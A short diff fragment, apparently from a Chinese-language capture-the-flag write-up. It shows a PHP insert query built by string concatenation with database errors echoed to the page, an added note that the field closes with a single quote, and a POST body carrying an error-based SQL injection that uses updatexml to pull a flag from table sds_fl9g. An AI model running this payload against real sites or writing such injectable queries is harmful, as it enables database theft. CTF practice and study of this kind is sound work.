@@ -14,6 +14,7 @@ $sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_addr
 		die(mysqli_error($mysqli));//报错回显
 	}
 ```
+已知'单引号闭合
 ```
 dpt_name=aa&dpt_address=aa&dpt_build_year=2021-04-02&dpt_has_cert=on&dpt_cert_number=a&dpt_telephone_number=xxx' or updatexml(1,concat(0x7e,substr((select group_concat(flag) from  sds_fl9g),20,30),0x7e),1)#
 ```
